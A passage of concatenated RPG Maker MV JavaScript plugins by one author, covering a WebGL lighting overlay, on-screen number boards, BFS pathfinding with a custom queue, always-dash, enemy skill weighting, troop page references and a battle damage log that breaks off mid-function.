	gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, tbl2.glbuf_i);
	gl.bindBuffer(gl.ARRAY_BUFFER, tbl2.glbuf);
	gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, tbl2.eles, gl.STATIC_DRAW);
	gl.bufferData(gl.ARRAY_BUFFER, tbl2.data, gl.STATIC_DRAW);
	const loc_uReso = gl.getUniformLocation(prog2, "u_reso");
	{ const c=gl.canvas;
	gl.uniform2f(loc_uReso, c.width, c.height);
	}
	const loc_vert = gl.getAttribLocation(prog2, "a_vert");
	gl.vertexAttribPointer(loc_vert, 1, gl.FLOAT, false, 1 * Float32Array.BYTES_PER_ELEMENT,  0);
	if(!tbl2.enabled){
		tbl2.enabled=true;
		gl.enableVertexAttribArray(loc_vert);
	}
	gl.drawElements(gl.TRIANGLES, tbl2.eles.length, gl.UNSIGNED_SHORT, 0);
	}
	
	gl.blendFunc(gl.ONE,gl.ONE_MINUS_SRC_ALPHA);
	// gl.blendEquation(gl.FUNC_ADD); // already
	// gl.colorMask(1,1,1,1); // already
	
	// restore
	gl.useProgram(old_prog);
	gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, old_abi, gl.STATIC_DRAW);
	gl.bindBuffer(gl.ARRAY_BUFFER, old_ab, gl.STATIC_DRAW);
	for(let i=0,sz=old_attr_cnt;i!==sz;++i){
		if(!old_attr[i]) continue;
		gl.vertexAttribPointer(
			old_attr_idx[i],
			old_attr_size[i],
			old_attr_type[i],
			old_attr_isNorm[i],
			old_attr_stride[i],
			old_attr_offset[i]
		);
	}
}).tbl={
	forEach:function f(p){
		if(p.viewRadius2){
			let r2=p.viewRadius2(); if(!r2) return;
			let r1=p.viewRadius1();
			r1*=r1;
			r2*=r2;
			
			f.eles.push(
				f.k,f.k+1,f.k+2,
				f.k,f.k+2,f.k+3,
				f.k,f.k+3,f.k+4,
				f.k,f.k+4,f.k+1
			);
			const x=p.x,y=p.y;
			for(let t=0,data=f.data;t!==5;++t){
				data[f.j++]=x;
				data[f.j++]=y;
				data[f.j++]=r1;
				data[f.j++]=r2;
				data[f.j++]=t;
				++f.k;
			}
		}
	},
	shaderSrcV:"precision lowp float;\n\nuniform vec2 u_resolution;\nuniform float u_baseAlpha;\n\nattribute vec2 a_center,a_radius2;\nattribute float a_dir;\n\nvarying vec2 center;\nvarying float radius12,radius22,baseAlpha;\n\nvoid main(){\n\tvec2 xy=vec2(0.0,0.0);\n\tif(a_dir==0.0) xy=a_center;\n\tif(a_dir==1.0) xy=u_resolution;\n\tif(a_dir==2.0) xy=vec2(0.0,u_resolution.y);\n\tif(a_dir==4.0) xy=vec2(u_resolution.x,0.0);\n\txy=xy/u_resolution*2.0-1.0;\n\t\n\tcenter = a_center;a_dir;\n\tradius12 = a_radius2[0];\n\tradius22 = a_radius2[1];\n\tbaseAlpha = u_baseAlpha;\n\tgl_Position = vec4(xy*vec2(1, -1),1.0,1.0);\n}",
	shaderSrcF:"precision lowp float;\n\nvarying vec2 center;\nvarying float radius12,radius22,baseAlpha;\n\nvoid main() {\n\tfloat dx = center.x - gl_FragCoord.x;\n\tfloat dy = center.y - gl_FragCoord.y;\n\tfloat d2 = dx*dx + dy*dy;\n\t\n\tfloat a=1.0;\n\tif ( d2 >= radius22 ) a=baseAlpha;\n\telse if ( d2 >= radius12 ) a=(radius22-d2)/(radius22-radius12)*(1.0-baseAlpha)+baseAlpha;\n\n\tgl_FragColor = vec4(0.0, 0.0, 0.0, a);\n}",
	shaderV:undefined,
	shaderF:undefined,
	glbuf:undefined,
	glbuf_i:undefined,
	ab:undefined,
	ab_i:undefined,
	prog:undefined,
	ext:undefined,
	enabled:false,
	prog2:{
		shaderSrcV:"precision lowp float;\n\nuniform vec2 u_reso;\n\nattribute float a_vert;\n\nvoid main(){\n\tvec2 xy=vec2(0.0,0.0);\n\tif(a_vert>0.0) xy.x=u_reso.x;\n\tif(a_vert*a_vert>1.5) xy.y=u_reso.y;\n\txy=xy/u_reso*2.0-1.0;\n\tgl_Position = vec4(xy*vec2(1.0, -1.0),1.0,1.0);\n}",
		shaderSrcF:"precision lowp float;\n\nvoid main() {\n\tgl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);\n}",
		shaderV:undefined,
		shaderF:undefined,
		glbuf:undefined,
		glbuf_i:undefined,
		enabled:false,
	},
};
}

Game_Screen.prototype.setLimitedView=function(value){
	this.limitedView=value;
};

{ const p=Sprite_Base.prototype;
p.viewRadius2=p.viewRadius1=undefined;
}

{ const p=Sprite_Character.prototype;
p.viewRadius1=function(){
	return this._character.viewRadius1();
};
p.viewRadius2=function(){
	return this._character.viewRadius2();
};
}

{ const p=Game_Character.prototype;
p.viewRadius1=function(){
	return this._viewRadius1||0;
};
p.viewRadius2=function(){
	return this._viewRadius2||0;
};
}

{ const p=Game_Event.prototype;
k='initialize';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	const meta=this.event().meta;
	if(meta.light) this._viewRadius1=Number(meta.light)*48;
	if(meta.lightG) this._viewRadius2=(Number(meta.lightG)*48||0)+(this._viewRadius1||0);
}).ori=r;
}

{ const p=Sprite_Battler.prototype;
p.viewRadius1=function(){
	return this._battler.viewRadius1();
};
p.viewRadius2=function(){
	return this._battler.viewRadius2();
};
}

{ const p=Game_Battler.prototype;
p.viewRadius1=function(){
	return this._viewRadius1||0;
};
p.viewRadius2=function(){
	return this._viewRadius2||0;
};
}

})();



﻿"use strict";
/*:
 * @plugindesc 數字板
 * @author agold404
 *
 * @help SceneManager.showNumBoard(id,num,option)
 * SceneManager.closeNumBoard(id)
 * 
 * option:
 * {
 *  width: a number or leave undefined,
 *  height: a number or leave undefined,
 *  loc: LU|UR|DR|LD or leave undefined
 * }
 *
 * 
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

{ const p=SceneManager;
p._numBoard_map=function(){
	return this._scene._umBoards||(this._scene._umBoards=new Map());
};
p._numBoard_gen=function(w,h){
	const rtv=new Window_Help(2);
	if(isNaN(w)) w=Graphics._boxWidth>>1;
	rtv.width=w;
	if(!isNaN(h)) rtv.height=h;
	const fs=~~(rtv.standardFontSize()*1.25);
	rtv.standardFontSize=()=>fs;
	rtv._dy=16;
	return rtv;
};
p._numBoard_loc=function(bd,loc){
	switch(loc){
	case "DR":
	case "RD":
		bd.x=Graphics._boxWidth-bd.width;
		bd.y=Graphics._boxHeight-bd.height;
	break;
	default:
	case "UL":
	case "LU":
		bd.x=0;
		bd.y=0;
	break;
	case "DL":
	case "LD":
		bd.x=0;
		bd.y=Graphics._boxHeight-bd.height;
	break;
	case "UR":
	case "RU":
		bd.x=Graphics._boxWidth-bd.width;
		bd.y=0;
	break;
	}
};
p._numBoard_num=function(bd,num,title,color){
	if(bd._num!==num||bd._color!==color){
		bd._num=num;
		bd._color=color;
		const isNeg=num<0;
		if(isNeg) num=-num;
		bd.setText(title);
		const txtsh=bd._maxShiftWidth+bd.contentsWidth();
		if(bd._dmg) bd.removeChild(bd._dmg);
		bd.addChild(bd._dmg=new Sprite_Damage());
		bd._dmg.y=71;
		bd._dmg.createDigits(color,num);
		const W=bd._dmg.digitWidth();
		for(let arr=bd._dmg.children,sh=txtsh+32+(W*isNeg)+((arr.length*W)>>1),x=0;x!==arr.length;++x) arr[x].x+=sh;
		//bd.setText(isNeg?"-":"");//(isNeg?"\n￣":"");
	}
	bd._dmg._duration=1<<30;
};
p.showNumBoard=function(id,num,opt){
	num=num-0||0;
	opt=opt||{};
	const sc=this._scene; if(!sc) return;
	let tmp;
	const map=this._numBoard_map();
	tmp=map.get(id); if(!tmp){
		map.set(id,tmp=this._numBoard_gen(opt.width,opt.height));
		sc.addChild(tmp);
	}
	const bd=tmp;
	const title=opt.title===undefined?"":opt.title+"";
	this._numBoard_num(bd,num,title,opt.color&3);
	this._numBoard_loc(bd,opt.loc);
};
p.closeNumBoard=function(id){
	const sc=this._scene; if(!sc) return;
	const bd=this._numBoard_map().get(id);
	this._numBoard_map().delete(id);
	if(!bd) return;
	const dmg=bd._dmg;
	const dmgp=dmg&&dmg.parent;
	if(dmgp) dmgp.removeChild(dmg);
	const p=bd.parent;
	if(p) p.removeChild(bd);
};
}

})();


﻿"use strict";
/*:
 * @plugindesc bfs search path
 * @author agold404
 *
 * @help so player will have the ability to move diagonally
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const w=window; if(!w.Queue){
	w.Queue=function(){ this.initialize.apply(this,arguments); };
	const p=w.Queue.prototype;
	p.constructor=w.Queue;
	p.initialize=function(init_size_or_array,kargs){
		if(init_size_or_array instanceof Array){
			this._data=init_size_or_array;
			this._initSize=null;
			const len=init_size_or_array.length;
			let v=len+1;
			v |= v >>> 1;
			v |= v >>> 2;
			v |= v >>> 4;
			v |= v >>> 8;
			v |= v >>> 16;
			this.clear(v+1,kargs);
			this._ende=this._len=len;
		}else{
			this._data=[];
			this.clear(this._initSize=init_size_or_array,kargs);
		}
	};
	p.objcnt=function(){return this._len;};
	p.arrsize=function(){return this._data.length;};
	p._lastIdx=function(){
		let tmp=this._ende-1;
		return (tmp<0)*this._data.length+tmp;
	};
	p.clear=function(init_size,kargs){
		if(init_size===undefined) init_size=this._initSize;
		if(!(init_size>=8)) init_size=8;
		this._ende=this._strt=0;
		this._len=0;
		this._data.length=init_size;
	};
	Object.defineProperties(p,{
		length: {
			get:function(){
				return this._len;
			},
			set:function(rhs){
				if(rhs) throw new Error('\'Queue\' not support setting \'length\' to non-zero');
				else this.clear();
			},
		configurable: false},
		front: {
			get:function(){
				return this._ende===this._strt?undefined:this._data[this._strt];
			},
			set:function(rhs){
				return this._ende===this._strt?this._data[this.push(rhs)]:(this._data[this._strt]=rhs);
			},
		configurable: false},
		0: {
			get:function(){ return this.front; },
			set:function(rhs){ return this.front=rhs; },
		configurable: false},
		back: {
			get:function(){
				return this._ende===this._strt?undefined:this._data[this._lastIdx()]; },
			set:function(rhs){
				return this._ende===this._strt?this._data[this.push(rhs)]:(this._data[this._lastIdx()]=rhs);
			},
		configurable: false}
	});
	p._enlargeIfNeeded=function(padFrontN){
		padFrontN|=0;
		const minLen=this._len+padFrontN+2;
		if(this._data.length<minLen){
			const currLen=this._data.length;
			this._data.length<<=1; // 'currLen' same as delta
			if(this._data.length<minLen) this._data.length=minLen.ceilPow2();
			this._strt-=padFrontN;
			this._strt+=(this._strt<0)*this._data.length;
			if(this._ende<this._strt){
				if(currLen-this._strt<this._ende){
					for(let x=this._strt;x!==currLen;++x) this._data[currLen+x]=this._data[x];
					this._strt+=currLen;
				}else{
					for(let x=0;x!==this._ende;++x) this._data[currLen+x]=this._data[x];
					this._ende+=currLen;
				}
			}
			this._strt+=padFrontN;
			this._strt-=(this._strt>=this._data.length)*this._data.length;
		}
	};
	p._addUintBracketProperty=function(){
		if(!Object.getOwnPropertyDescriptor(p,this.length)){
			const n=this.length;
			Object.defineProperty(p,n,{
				get:function(){ return this.getnth(n); },
				set:function(rhs){ return this.setnth(n,rhs); },
			});
		}
	};
	r=p.push=function(obj){
		this._addUintBracketProperty();
		this._enlargeIfNeeded();
		++this._len;
		let rtv=0;
		this._data[rtv=this._ende++]=obj;
		this._ende-=(this._ende>=this._data.length)*this._data.length;
		return rtv;
	};
	p.push_back=r;
	p.push_front=function(obj){
		this._addUintBracketProperty();
		this._enlargeIfNeeded(1);
		++this._len;
		--this._strt;
		const rtv=this._strt+=(this._strt<0)*this._data.length;
		this._data[rtv]=obj;
		return rtv;
	};
	r=w.Queue.prototype.pop=function(){
		if(this._ende===this._strt) return false;
		if(0===--this._len){ this.clear(); return true; }
		++this._strt;
		this._strt-=(this._strt>=this._data.length)*this._data.length;
		return true;
	};
	p.pop_front=r;
	p.shift=function f(){
		const rtv=this[0];
		this.pop_front();
		return rtv;
	};
	p.pop_back=function(){
		if(this._ende===this._strt) return false;
		if(0===--this._len){ this.clear(); return true; }
		--this._ende;
		this._ende+=(this._ende<0)*this._data.length;
		return true;
	};
	p._toValidIdx=function(n){
		n=Number(n); if(isNaN(n)||n>=this._len||this._len<-n) return undef;
		if(n<0){ n+=this._ende; n+=(n<0)*this._data.length; }
		else{ n+=this._strt; n-=(n>=this._data.length)*this._data.length; }
		return n;
	};
	p.getnth=function(n){ return this._data[this._toValidIdx(n)]; }; // 0-base
	p.setnth=function(n,rhs){
		let idx=this._toValidIdx(n); if(idx===undef) return undefined;
		this._data[idx]=rhs;
		return true;
	}; // 0-base
	p.forEach=function(func,asThis){
		const self=arguments.length<2?null:asThis;
		if(this._ende>=this._strt) this._data.slice(this._strt,this._ende).forEach(func,self);
		else{
			const p1=this._data.slice(this._strt),p2=this._data.slice(0,this._ende);
			p1.forEach(func,self);
			p2.forEach(func,self);
		}
	};
} }

{ const p=Game_Character.prototype;
k='canPassDiagNumpad';
p[k]=function f(x,y,dir){
	return this.canPassDiagonally(x,y,f.h[dir],f.v[dir]);
};
//     [0,1,2,3,4,5,6,7,8,9];
p[k].h=[0,4,0,6,4,0,6,4,0,6];
p[k].v=[0,2,2,2,0,0,0,8,8,8];
t=p.moveDiagNumpad=function f(d){ d|=0; if(!d) return;
	const dir0=this.direction(),dir1=f.tbl[dir0>>1][d];
	this.moveDiagonally(f.h[d],f.v[d]);
	dir1 && this.setDirection(dir1);
};
t.h=p[k].h;
t.v=p[k].v;
t.tbl=[
	[0,1,2,3,4,5,6,7,8,9],
	[2,2,2,2,4,0,6,4,8,6],
	[4,4,2,2,4,0,6,4,8,8],
	[6,2,2,6,4,0,6,8,8,6],
	[8,4,2,6,4,0,6,8,8,8],
	[],
];
p.findDirTo=function f(goals,disables,kargs){
	// goals = [ [x,y,costAdd] , ... ]
	// kargs:
	// 	tileOnly: check pass only on tiles = '$gameMap.isPassable', not 'chr.canPass'
	if(f.inited===undefined){
		f.inited=1;
		f.chooseX=(self,c_and_deltaX,costs,newIdx,mapWidth,test_passable=0)=>{
			// rtv{} , arr , const , const
			// &&+x
			let newx=$gameMap.roundXWithDirection(self._x,6);
			//console.log(1,goalx,goaly,newx,newx<mapWidth,costs[newIdx-self._x+newx]); // debug
			if((!test_passable||self.canPass(self._x,self._y,6)) && newx<mapWidth && (newc=costs[newIdx-self._x+newx])<c_and_deltaX.c){
				c_and_deltaX.c=newc;
				c_and_deltaX.d=1;
			}
			// &&-x
			newx=$gameMap.roundXWithDirection(self._x,4);
			//console.log(2,goalx,goaly,newx,newx>=0,costs[newIdx-self._x+newx]); // debug
			if((!test_passable||self.canPass(self._x,self._y,4)) && newx>=0 && (newc=costs[newIdx-self._x+newx])<c_and_deltaX.c){
				c_and_deltaX.c=newc;
				c_and_deltaX.d=-1;
			}
		};
	}
	if(!goals||goals.length===0) return 0;
	const mapWidth = $gameMap.width() , mapHeight = $gameMap.height();
	const cd=false; // !!this.canDiag; // boolean
	const strtIdx=this._y*mapWidth+this._x;
	disables=disables?new Set(disables.map(p=>p.y*mapWidth+p.x)):new Set();
	kargs=kargs||{};
	const tileOnly=kargs.tileOnly;
	
	// reversed search: goal -> start
	// - bfs: mark costs
	const cacheKey=JSON.stringify({goals:goals,disables:disables})+(tileOnly?"-tileOnly":"");
	if(!$dataMap.cache_findDirTo) $dataMap.cache_findDirTo=new Map();
	let cache=$dataMap.cache_findDirTo.get(cacheKey);
	let costs,queue;
	if(cache&&( tileOnly?(cache.rs===DataManager.resetSerial):(cache.fc===Graphics.frameCount) )){ // suppose not much different
		costs=cache;
		queue=cache.Q;
	}else{
		cache=undefined; // later use 'cache===undefined' to determine wheather to set new cache
		costs=[]; costs.length=mapWidth*mapHeight; for(let x=0;x!==costs.length;++x) costs[x]=costs.length;
		costs.P=[];
		
		const tmparr=[];
		// - init cost near goals
		for(let gid=0;gid!==goals.length;++gid){
			const goal=goals[gid];
			const goalx=goal[0]=$gameMap.roundX(goal[0]),goaly=$gameMap.roundY(goal[1]);
			if(!$gameMap.isValid(goalx,goaly)) continue;
			const newIdx=goaly*mapWidth+goalx;
			costs.P[newIdx]=4;
			if(!disables.has(newIdx))
				tmparr.push({x:goalx,y:goaly,c:(goal[2]^0)+(0^0)});
		}
		// - - surroundings, prevent from 'clicking on events causes no effect'
		for(let gid=0;gid!==goals.length;++gid){
			const goal=goals[gid];
			const goalx=goal[0],goaly=goal[1];
			for(let dir=10;dir-=2;){
				const newx=$gameMap.roundXWithDirection(goalx,dir);
				const newy=$gameMap.roundYWithDirection(goaly,dir);
				if(!$gameMap.isValid(newx,newy)) continue;
				const newIdx=newy*mapWidth+newx;
				costs.P[newIdx]=4;
				if(!disables.has(newIdx))
					tmparr.push({x:newx,y:newy,c:(goal[2]^0)+(1^0)});
			}
		}
		
		tmparr.sort((a,b)=>a.c-b.c);
		queue=new Queue(tmparr);
	}
	const pushed=costs.P;
	
	// - strt / resume : log frameCount or resetSerial (tileOnly)
	if(costs[strtIdx]===costs.length){ if(tileOnly) costs.rs=DataManager.resetSerial; else costs.fc=Graphics.frameCount; while(queue.length){
		const curr=queue.front; queue.pop();
		const currIdx=curr.y*mapWidth+curr.x;
		if(curr.c>=costs[currIdx]||disables.has(currIdx)) continue;
		const newCost=(costs[currIdx]=curr.c)+1;
		for(let dir=10;dir-=2;){
			const newx=$gameMap.roundXWithDirection(curr.x,dir);
			const newy=$gameMap.roundYWithDirection(curr.y,dir);
			if(!$gameMap.isValid(newx,newy)) continue;
			const newIdx=newy*mapWidth+newx;
			if( pushed[newIdx]>3 || 
				!(tileOnly?$gameMap.isPassable(newx,newy,10-dir):this.canPass(newx,newy,10-dir)) // reversed search
				){
				pushed[newIdx]|=0; ++pushed[newIdx];
				continue;
			}
			if(newCost<costs[newIdx]){
				pushed[newIdx]=4;
				queue.push({x:newx,y:newy,c:newCost});
			}
		}
		if(currIdx===strtIdx&&!kargs.fullSearch) break;
	} }
	
	// costs is not from cache, add: costs , time slot (@bfs_strt) , remained queue
	if(!cache){ 
		costs.Q=queue;
		$dataMap.cache_findDirTo.set(cacheKey,costs);
	}
	
	// tell direction
	const dx=goals[0][0]-this.x,dy=goals[0][1]-this.y;
	let c_and_dir={c:costs[strtIdx],dir:0},newc=0;
	// value of dir : direction on numpad
	// +-x
	{
		const c_and_deltaX={c:costs[strtIdx],d:0};
		f.chooseX(this,c_and_deltaX,costs,strtIdx,mapWidth,costs[strtIdx]>1); c_and_deltaX.d+=5;
		if( (costs[strtIdx]===1||this.canPass(this._x,this._y,c_and_deltaX.d)) && c_and_deltaX.c<c_and_dir.c ){
			c_and_dir.c=c_and_deltaX.c;
			c_and_dir.dir=c_and_deltaX.d;
		}
	}
	// +y
	let newy=$gameMap.roundYWithDirection(this._y,2);
	if(newy<mapHeight){
		const newIdx=strtIdx+(newy-this._y)*mapWidth;
		if( (costs[strtIdx]===1||this.canPass(this._x,this._y,2)) ){
			newc=costs[newIdx];
			if( costs[newIdx]<c_and_dir.c || (costs[newIdx]!==costs.length && costs[newIdx]===c_and_dir.c && dx*dx<dy*dy) ){
				c_and_dir.c=newc;
				c_and_dir.dir=2;
			}
		}
		if(cd){
			const c_and_deltaX={c:costs[strtIdx],d:0};
			f.chooseX(this,c_and_deltaX,costs,newIdx,mapWidth);
			let newDir=c_and_deltaX.d+2;
			if(c_and_deltaX.c<c_and_dir.c && this.canPassDiagNumpad(this._x,this._y,newDir)){
				c_and_dir.c=c_and_deltaX.c;
				c_and_dir.dir=newDir;
			}
		}
	}
	// -y
	newy=$gameMap.roundYWithDirection(this._y,8);
	if(newy>=0){
		const newIdx=strtIdx+(newy-this._y)*mapWidth;
		if( (costs[strtIdx]===1||this.canPass(this._x,this._y,8)) ){
			newc=costs[newIdx];
			if( costs[newIdx]<c_and_dir.c || (costs[newIdx]!==costs.length && costs[newIdx]===c_and_dir.c && dx*dx<dy*dy) ){
				c_and_dir.c=newc;
				c_and_dir.dir=8;
			}
		}
		if(cd){
			const c_and_deltaX={c:costs[strtIdx],dir:0};
			f.chooseX(this,c_and_deltaX,costs,newIdx,mapWidth);
			let newDir=c_and_deltaX.d+8;
			if(c_and_deltaX.c<c_and_dir.c && this.canPassDiagNumpad(this._x,this._y,newDir)){
				c_and_dir.c=c_and_deltaX.c;
				c_and_dir.dir=newDir;
			}
		}
	}
	return c_and_dir.dir;
};
p.findDirTo.tbl=[
	[2,8,4,6],
];
p.moveTowardCharacter_findDirTo=function f(chr){
	return this.moveDiagNumpad(this.findDirTo([[chr.x,chr.y]]));
};
(p.moveTowardCharacters_findDirTo=function f(chrs){
	return this.moveDiagNumpad(this.findDirTo(chrs.map(f.forEach)));
}).forEach=chr=>[chr.x,chr.y];
}

{ const p=Game_Player.prototype;
k='findDirectionTo';
r=p[k]; (p[k]=function f(){
	return this.findDirTo([[arguments[0],arguments[1]]])||f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc alwaysDash
 * @author agold404
 *
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

{ const p=ConfigManager;
k='applyData';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	if(arguments[0].alwaysDash===undefined) this.alwaysDash = true;
}).ori=r;
p.alwaysDash=true;
}

})();


﻿"use strict";
/*:
 * @plugindesc 獵奇怪物出招技能組
 * @author agold404
 *
 * @help 詳細說明
 * 第二行
 * 
 * This plugin can be renamed as you want.
 */

if(Utils.isOptionValid('test')){ let k,r;

{ const p=Game_Enemy.prototype;
k='selectAction';
p["_"+k+"_w_state"]=(actor,stateId)=>{
	let rtv=0;
	if(actor.isDeathStateAffected()) return 0;
	if(stateId===actor.deathStateId()) rtv=2;
	else if(!actor.isStateResist(stateId)&&!actor.isStateAffected(stateId)){
		rtv=$dataStates[stateId].traits.
			filter(x=>x.code===22&&x.dataId===7).
			reduce((r,t)=>r-t.value,0);
	}else rtv=0.125;
	return Math.max(rtv,0);
};
p["_"+k+"_w_dmg"]=(a,b,dmg)=>{
	let v = $gameVariables._data;
	try{
		let value = Math.max(eval(dmg.formula), 0);
		if (isNaN(value)) value = 0;
		return value/b.mhp;
	}catch(e){
		return 0;
	}
};
r=p[k]; (p[k]=function(actionList, ratingZero){
	let sum=0,weights=[];
	for(let x=0;x!=actionList.length;++x){
		const a = actionList[x];
		const skill=$dataSkills[a.skillId];
		const addStatesEffs=skill.effects.filter(x=>x.code===21&&x.dataId);
		let addedWeight=0;
		const pt=$gameParty.members();
		if(skill.scope===2){
			let tmp=0;
			for(let x=0;x!==addStatesEffs.length;++x){
				tmp+=Math.max.apply(null,pt.map(actor=>this._selectAction_w_state(actor,addStatesEffs[x].dataId)*addStatesEffs[x].value1))||0;
			}
			addedWeight+=tmp*pt.length;
			addedWeight+=pt.map(actor=>this._selectAction_w_dmg(this,actor,skill.damage)).
				reduce((r,n)=>r+n,0);
		}else if(skill.scope>0&&skill.scope<7){
			addedWeight+=pt.reduce((r,actor)=>{
				let rtv=r;
				for(let x=0;x!==addStatesEffs.length;++x) rtv+=this._selectAction_w_state(actor,addStatesEffs[x].dataId)*addStatesEffs[x].value1;
				rtv+=this._selectAction_w_dmg(this,actor,skill.damage);
				return rtv;
			},0);
			addedWeight+=Math.max(Math.max.apply(null,pt.map(actor=>this._selectAction_w_dmg(this,actor,skill.damage)) )||0,0);
		}
		addedWeight/=$gameParty._actors.length<<1;
		sum += (weights[x] = addedWeight + a.rating - ratingZero);
	}
	if(actionList.length){
		let ch=0;
		for(let i=0,val=Math.random()*sum;i!==actionList.length;++i){
			val -= weights[i];
			if(val < 0){ ch=i; break; }
		}
		return actionList[~~(Math.random()*actionList.length)];
	}else return null;
}).ori=r;
}

}


﻿"use strict";
/*:
 * @plugindesc troop: ref a page's all cmds at some points
 * @author agold404
 *
 * @help (use comment)
 * 
 * name=a_name_defined_by_game_dever_starting_with_not/^\+-[0-9]/
 * 
 * use=
 * page number (editor view)
 * page number delta (this page number + delta = target page nubmer)
 * page name (set by name=)
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;
{ const p=Scene_Boot.prototype;

k='start';
r=p[k]; (p[k]=function f(){
	$dataTroops.forEach(f.makeTroopPgName);
	$dataTroops.forEach(f.placingRefTroopPgs);
	return f.ori.apply(this,arguments);
}).ori=r;

{ const kw="name=",re_invalid=/^\+-[0-9]/;
p[k].makeTroopPgName=dataobj=>{ if(!dataobj) return;
	const m=dataobj.name2pgidx=new Map();
	for(let pgs=dataobj.pages,p=0;p!==pgs.length;++p){
		for(let cmds=pgs[p].list,c=0;c!==cmds.length;++c){
			if(cmds[c].code===108 && cmds[c].parameters[0].slice(0,kw.length)===kw){
				m.set(pgs[p].name=cmds[c].parameters[0].slice(kw.length),p);
				if(pgs[p].name.match(re_invalid)) throw new Error('not a valid page name @ troop id='+dataobj.id+' page '+(p+1));
				break;
			}
		}
	}
};
}

{ const kw="use=",tunePage=(dataobj,pgs,p,visiting)=>{
	if(pgs[p].list_ori) return;
	if(visiting.has(p)){
		const arr=[]; visiting.forEach(x=>arr.push(x));
		throw new Error('loop detected @ troop id='+dataobj.id+' page '+(p+1)+"\n loop = "+JSON.stringify(arr));
	}
	visiting.add(p);
	const newcmds=[];
	for(let cmds=pgs[p].list,c=0;c!==cmds.length;++c){
		if(cmds[c].code===108 && cmds[c].parameters[0].slice(0,kw.length)===kw){
			const useval=cmds[c].parameters[0].slice(kw.length);
			let delta=false,num;
			switch(useval[0]){
			case '+':
			case '-': delta=true;
			// use editor order
			case '1':
			case '2':
			case '3':
			case '4':
			case '5':
			case '6':
			case '7':
			case '8':
			case '9':
				// by number
				num=Number(useval);
			break;
			default:
				// by name
				num=dataobj.name2pgidx.get(useval)+1;
			break;
			}
			if(!num) throw new Error('refered page num is NaN or 0 ('+useval+') @ troop id='+dataobj.id+' page '+(p+1)); // not accept delta=0 or page=0
			const rp=num+(delta?p:-1);
			if(!(rp>=0&&rp<pgs.length)) throw new Error('refered page out of bound @ troop id='+dataobj.id+' page '+(p+1)); // not accept delta=0 or page=0
			tunePage(dataobj,pgs,rp,visiting); // ensure list is done with replacements
			for(let x=0,arr=pgs[rp].list;x!==arr.length;++x){
				const obj=JSON.parse(JSON.stringify(arr[x]));
				obj.indent+=cmds[c].indent;
				newcmds.push(obj);
			}
			++c; while(cmds[c]&&cmds[c].code===408) ++c;
			--c;

		}else newcmds.push(cmds[c]);
	}
	pgs[p].list_ori=pgs[p].list;
	pgs[p].list=newcmds;
	visiting.delete(p);
};
p[k].placingRefTroopPgs=dataobj=>{ if(!dataobj) return;
	const visiting=new Set();
	for(let pgs=dataobj.pages,p=0;p!==pgs.length;++p) tunePage(dataobj,pgs,p,visiting);
};
}

}
})();


﻿"use strict";
/*:
 * @plugindesc OvO
 * @author agold404
 *
 * @help OxO
 * 
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

new cfc(Game_Battler.prototype).add('onBattleStart',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.onBattleStart_dmgLog();
	return rtv;
}).add('onBattleStart_dmgLog',function f(){
	this._dmgLog=[];
},undefined,false,true).add('onBattleEnd',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.onBattleEnd_dmgLog();
	return rtv;
}).add('onBattleEnd_dmgLog',function f(){
	this._dmgLog=undefined;
});

{ const p=BattleManager;
p._setDmgLogBase=function f(t,type,ele){
	const v=this.getDmgSum(t,type,ele)+this._getDmgLogBase(t,type,ele); if(!v) return 0;
	let b=t._dmgLog._base; if(!b) b=t._dmgLog._base={};
	let o=b[type]; if(!o) o=b[type]={};
	return o[ele]=v;
};
p._getDmgLogBase=function f(t,type,ele){
	const b=t&&t._dmgLog&&t._dmgLog._base; // cleared in onBattleStart
	const o=b&&b[type];
	return o&&o[ele]||0;
};
p.clearDmgLog=function f(t,type,ele){
	if(!type) t._dmgLog=[]; // clear it via using new obj
	else this._setDmgLogBase(t,type,ele);
};
p.clearExeLog=function(s){ this.getExeLogger().delete(s); };
p.getExeLogger=function(){
	if(!this._exeLog) this._exeLog=new Map();
	return this._exeLog;
};
k='startBattle';
r=p[k]; (p[k]=function f(){
	this.getExeLogger().clear();
	return f.ori.apply(this,arguments);
}).ori=r;
p._calEleRatio=(info,ele)=>{
	if(ele===undefined) return 1;
	let elesCnt=0,eleCnt=0;
	for(let y=0;y!==info.eles.length;++y){ if(info.eles[y]){
		elesCnt+=info.eles[y].length;
		for(let z=0,arrz=info.eles[y];z!==arrz.length;++z) eleCnt+=arrz[z]===ele;
	} }
	return eleCnt?eleCnt/elesCnt:0;
};
p._logDmg=(t,info,r,ele)=>{
	let eleObj=t._dmgLog.byEle.get(ele);
	if(!eleObj) t._dmgLog.byEle.set(ele, eleObj={hp:0,mp:0,tp:0,} );
	eleObj.hp+=info.dhp*r;
	eleObj.mp+=info.dmp*r;
	eleObj.tp+=info.dtp*r;
};
p.logDmg=function(t,info,s){
	if(!this._phase) return;
	if(!t._dmgLog) this.clearDmgLog(t);
	t._dmgLog.push(info);
	if(t._dmgLog.eles){
		for(let x=0,arr=t._dmgLog.eles;x!==arr.length;++x){
			this._logDmg(t,info,this._calEleRatio(info,arr[x]),arr[x]);
		}
	}
	const m=this.getExeLogger();
	let arr=m.get(s); if(!arr) m.set(s,arr=[]);
	arr.push(info);
	if(arr._byDataobj){
		const precal=arr._byDataobj.get(info.item); if(precal){
			precal.hp+=info.dhp;
			precal.mp+=info.dmp;
			precal.tp+=info.dtp;
		}
	}
};
p.getDmgSum=function(t,type,ele){
	if(!t||!t._dmgLog) return;
	let m=t._dmgLog.byEle; if(!m) t._dmgLog.byEle=m=new Map();
	let rtv=m.get(ele); if(rtv!==undefined) return rtv[type]-this._getDmgLogBase(t,type,ele)||0;
	rtv=0;
	if(!t._dmgLog.eles) t._dmgLog.eles=[];
	t._dmgLog.eles.push(ele);
